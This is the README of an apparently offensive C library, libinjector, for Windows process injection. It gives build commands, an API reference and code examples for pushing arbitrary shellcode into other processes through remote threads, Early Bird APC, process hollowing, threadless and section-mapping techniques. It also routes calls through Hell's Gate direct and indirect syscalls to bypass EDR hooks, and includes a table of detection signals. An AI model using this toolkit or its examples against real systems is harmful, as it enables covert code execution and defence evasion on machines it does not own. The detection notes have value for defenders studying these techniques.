# libinjector

**C library for Windows process injection — static or shared, no CRT dependency, direct syscall support via Hell's Gate SSN resolution.**

[![Language](https://img.shields.io/badge/language-C%2FC%2B%2B-lightgrey?style=flat-square)]()
[![Platform](https://img.shields.io/badge/platform-windows%20x64-blue?style=flat-square)]()
[![License](https://img.shields.io/badge/license-MIT-lightgrey?style=flat-square)](LICENSE)

---

## Table of Contents

1. [Overview](#1-overview)
2. [Build](#2-build)
3. [Integration](#3-integration)
4. [API Reference](#4-api-reference)
5. [Examples](#5-examples)
6. [Versioning](#6-versioning)
7. [Compatibility](#7-compatibility)
8. [Detection Notes](#8-detection-notes)
9. [License](#9-license)
10. [Contact](#10-contact)

---

## 1. Overview

libinjector exposes a uniform API over several Windows process injection primitives. Each technique is implemented as a self-contained translation unit — include only what you use.

Design goals:

- **No CRT** — compiles with `/GS-`, `/Zl`, no `malloc`/`free`. Memory allocation goes through caller-supplied allocator or direct `NtAllocateVirtualMemory`.
- **Direct syscall option** — every `NtXxx` call can be routed through a Hell's Gate stub resolved at runtime from the live ntdll, bypassing userland hooks.
- **Static or shared** — link as `.lib` (zero runtime dependency) or `.dll` (shared, for loaders that resolve exports dynamically).
- **Single header** — `#include "injector.h"` exposes the full API. No transitive includes.

What this library does not do: shellcode generation, encoding, encryption, or C2 communication. It moves bytes into a process and runs them.

---

## 2. Build

**Requirements:** MSVC (cl.exe) or MinGW-w64 (x86_64-w64-mingw32-gcc), no other dependencies.

```cmd
:: MSVC — static library
cl /nologo /W4 /O2 /GS- /Zl /c src\*.c
lib /nologo /out:dist\injector.lib *.obj

:: MSVC — shared DLL
cl /nologo /W4 /O2 /GS- /Zl /LD src\*.c /Fe:dist\injector.dll

:: MinGW — static
x86_64-w64-mingw32-gcc -O2 -nostdlib -c src/*.c
x86_64-w64-mingw32-ar rcs dist/libinjector.a *.o
```

Or use the provided Makefile:

```bash
make static     # → dist/injector.lib
make shared     # → dist/injector.dll + injector.lib (import lib)
make tests      # build and run test suite against a dummy target process
make all
```

**Headers to distribute:**

```
include/
  injector.h          Public API — include this
  injector_types.h    Structs and enums (included by injector.h)
  injector_syscall.h  Direct syscall stubs (optional — for hook bypass)
```

---

## 3. Integration

### MSVC project

```
Project Properties → Linker → Additional Dependencies: injector.lib
Project Properties → C/C++ → Additional Include Directories: path\to\libinjector\include
```

```c
#include "injector.h"

int main(void) {
    INJ_CONFIG cfg = {0};
    cfg.technique    = INJ_CLASSIC_REMOTE;
    cfg.syscall_mode = INJ_SYSCALL_DIRECT;   // bypass userland hooks
    cfg.target_pid   = 1234;
    cfg.shellcode    = buf;
    cfg.shellcode_sz = sizeof(buf);

    INJ_RESULT r = inj_inject(&cfg);
    return (r.status == INJ_OK) ? 0 : 1;
}
```

### CMake

```cmake
add_library(injector STATIC IMPORTED)
set_target_properties(injector PROPERTIES
    IMPORTED_LOCATION "${CMAKE_SOURCE_DIR}/lib/injector.lib"
    INTERFACE_INCLUDE_DIRECTORIES "${CMAKE_SOURCE_DIR}/include"
)
target_link_libraries(your_target PRIVATE injector)
```

### Go (cgo)

```go
// #cgo LDFLAGS: -L. -linjector -lntdll
// #include "injector.h"
import "C"
import "unsafe"

func inject(pid uint32, shellcode []byte) error {
    cfg := C.INJ_CONFIG{
        technique:    C.INJ_CLASSIC_REMOTE,
        syscall_mode: C.INJ_SYSCALL_DIRECT,
        target_pid:   C.DWORD(pid),
        shellcode:    (*C.BYTE)(unsafe.Pointer(&shellcode[0])),
        shellcode_sz: C.SIZE_T(len(shellcode)),
    }
    r := C.inj_inject(&cfg)
    if r.status != C.INJ_OK {
        return fmt.Errorf("inject failed: %d (win32: 0x%x)", r.status, r.win32_error)
    }
    return nil
}
```

---

## 4. API Reference

### Core

```c
// Single entry point — selects implementation based on cfg->technique
INJ_RESULT inj_inject(const INJ_CONFIG *cfg);

// Free resources allocated by the library (e.g. remote handle cleanup)
void inj_cleanup(INJ_RESULT *result);
```

### Configuration — `INJ_CONFIG`

```c
typedef struct INJ_CONFIG {
    INJ_TECHNIQUE    technique;      // required
    INJ_SYSCALL_MODE syscall_mode;   // INJ_SYSCALL_WINAPI (default) | INJ_SYSCALL_DIRECT
    DWORD            target_pid;     // required for remote techniques
    HANDLE           target_handle;  // optional — pre-opened handle (skips OpenProcess)
    BYTE            *shellcode;      // required
    SIZE_T           shellcode_sz;   // required
    DWORD            mem_protect;    // default: PAGE_EXECUTE_READ_WRITE (set to RX for ACG)
    BOOL             wait_thread;    // wait for injected thread to exit (blocking)
    DWORD            wait_timeout_ms;// 0 = infinite
} INJ_CONFIG;
```

### Techniques — `INJ_TECHNIQUE`

| Value | Technique | Target type | Thread created? |
|---|---|---|---|
| `INJ_CLASSIC_REMOTE` | VirtualAllocEx + WriteProcessMemory + CreateRemoteThread | Remote PID | Yes |
| `INJ_APC_EARLY_BIRD` | CreateProcess suspended + QueueUserAPC + ResumeThread | New process | No (resumes existing) |
| `INJ_APC_REMOTE` | OpenThread (alertable) + QueueUserAPC | Remote alertable thread | No |
| `INJ_HOLLOW_PROCESS` | CreateProcess suspended + NtUnmapViewOfSection + write EP | New process | No (hijacks EP) |
| `INJ_THREADLESS` | Overwrite function pointer in target (.data IAT or vtable) | Remote PID + offset | No |
| `INJ_MAPPING` | NtCreateSection + NtMapViewOfSection (shared) + RIP hijack | Remote PID + thread | No |

### Syscall mode — `INJ_SYSCALL_MODE`

| Value | Description |
|---|---|
| `INJ_SYSCALL_WINAPI` | Standard Win32 API — hooked by EDR |
| `INJ_SYSCALL_DIRECT` | Hell's Gate SSN resolution from live ntdll — bypasses userland hooks |
| `INJ_SYSCALL_INDIRECT` | Trampoline via ntdll gadget — bypasses stack-based hook detection |

### Result — `INJ_RESULT`

```c
typedef struct INJ_RESULT {
    INJ_STATUS status;          // INJ_OK | INJ_ERR_*
    DWORD      win32_error;     // GetLastError() at point of failure
    HANDLE     remote_thread;   // valid if technique creates a thread
    LPVOID     remote_base;     // base of allocated region in target
    SIZE_T     remote_sz;       // size of allocated region
    char       detail[128];     // human-readable error detail
} INJ_RESULT;
```

### Status codes

```c
INJ_OK                     // success
INJ_ERR_INVALID_ARG        // null shellcode, zero size, unknown technique
INJ_ERR_OPEN_PROCESS       // OpenProcess failed — check PID and privileges
INJ_ERR_ALLOC              // VirtualAllocEx / NtAllocateVirtualMemory failed
INJ_ERR_WRITE              // WriteProcessMemory / NtWriteVirtualMemory failed
INJ_ERR_THREAD             // CreateRemoteThread / RtlCreateUserThread failed
INJ_ERR_HOLLOW_UNMAP       // NtUnmapViewOfSection failed (process hollowing)
INJ_ERR_SSN_RESOLVE        // Hell's Gate: could not resolve SSN from ntdll
INJ_ERR_SUSPEND            // Could not suspend/resume target thread
INJ_ERR_TIMEOUT            // wait_thread = TRUE, thread did not exit within timeout
```

---

## 5. Examples

### Classic remote injection (Win32 API)

```c
#include "injector.h"

BOOL inject_classic(DWORD pid, BYTE *shellcode, SIZE_T len) {
    INJ_CONFIG cfg = {
        .technique    = INJ_CLASSIC_REMOTE,
        .syscall_mode = INJ_SYSCALL_WINAPI,
        .target_pid   = pid,
        .shellcode    = shellcode,
        .shellcode_sz = len,
        .mem_protect  = PAGE_EXECUTE_READ_WRITE,
    };
    INJ_RESULT r = inj_inject(&cfg);
    if (r.status != INJ_OK) {
        fprintf(stderr, "inject_classic failed: %s (0x%08X)\n", r.detail, r.win32_error);
        return FALSE;
    }
    inj_cleanup(&r);
    return TRUE;
}
```

### Early Bird APC (suspended process)

```c
// Spawn notepad.exe suspended, queue shellcode as APC, resume
INJ_CONFIG cfg = {
    .technique    = INJ_APC_EARLY_BIRD,
    .syscall_mode = INJ_SYSCALL_DIRECT,     // bypass hooks
    .shellcode    = buf,
    .shellcode_sz = sizeof(buf),
    // target_pid not needed — Early Bird creates a new process
};
INJ_RESULT r = inj_inject(&cfg);
```

### Process hollowing

```c
INJ_CONFIG cfg = {
    .technique    = INJ_HOLLOW_PROCESS,
    .syscall_mode = INJ_SYSCALL_INDIRECT,
    .shellcode    = buf,
    .shellcode_sz = sizeof(buf),
    .mem_protect  = PAGE_EXECUTE_READ,   // ACG-compatible
};
INJ_RESULT r = inj_inject(&cfg);
if (r.status == INJ_OK) {
    printf("hollow PID: %lu\n", GetProcessId(r.remote_thread));
}
inj_cleanup(&r);
```

---

## 6. Versioning

libinjector follows [Semantic Versioning](https://semver.org/). Breaking changes in the public API increment the major version.

| Version | Breaking changes |
|---|---|
| `2.0.0` | `INJ_CONFIG.spawn_path` removed — Early Bird now reads from `cfg.process_name`. Update callers. |
| `2.1.0` | Added `INJ_THREADLESS` technique. No breaking change. |
| `2.2.0` | `INJ_SYSCALL_INDIRECT` added to `INJ_SYSCALL_MODE`. No breaking change. |
| `3.0.0` (planned) | `inj_inject` return type changes from `INJ_RESULT` (struct by value) to `INJ_RESULT*` (caller-allocated). |

---

## 7. Compatibility

| Compiler | Version | Static | Shared | Notes |
|---|:---:|:---:|:---:|---|
| MSVC | VS 2019+ | ✔ | ✔ | `/GS-` required — link with `ntdll.lib` |
| MinGW-w64 | 11.0+ | ✔ | ✔ | `-lntdll` — GCC version `__declspec(dllexport)` needs `-Wno-attributes` |
| clang-cl | 14.0+ | ✔ | ✔ | Drop-in for MSVC — same flags |

| Target OS | Tested |
|---|:---:|
| Windows 10 21H2 / 22H2 | ✔ |
| Windows 11 22H2 / 23H2 | ✔ |
| Windows Server 2019 | ✔ |
| Windows Server 2022 | ✔ |
| Windows 7 | ✗ |

---

## 8. Detection Notes

The library implements the injection mechanics — detectability depends on which technique and syscall mode the caller uses.

| Technique | Noisiest API call | EDR signal |
|---|---|---|
| `INJ_CLASSIC_REMOTE` | `CreateRemoteThread` | Sysmon Event 8 — `CreateRemoteThread` |
| `INJ_APC_EARLY_BIRD` | `CreateProcess(CREATE_SUSPENDED)` | Sysmon Event 1 — suspended flag in process start |
| `INJ_HOLLOW_PROCESS` | `NtUnmapViewOfSection` on main image | ETW-TI kernel event — image unmap from live process |
| `INJ_THREADLESS` | `WriteProcessMemory` to `.data` | Sysmon Event 10 — `WriteProcessMemory` outside heap |
| `INJ_MAPPING` | `NtMapViewOfSection` cross-process | ETW-TI — shared section mapped into remote process |

With `INJ_SYSCALL_DIRECT`, userland hooks placed by EDR on `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, and `NtCreateThreadEx` are bypassed. Kernel-mode ETW (ETW-TI) and PPL-protected EDR callbacks (`PsSetCreateThreadNotifyRoutine`) are not affected by direct syscalls — they operate below the user/kernel boundary.

---

## 9. License

MIT License. See [LICENSE](LICENSE) for full terms.

---

## 10. Contact

[![ProtonMail](https://img.shields.io/badge/ProtonMail-8B89CC?style=flat-square&logo=protonmail&logoColor=white)](mailto:contact@franckferman.fr)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/franckferman)
[![X](https://img.shields.io/badge/X-000000?style=flat-square&logo=x&logoColor=white)](https://www.twitter.com/franckferman)
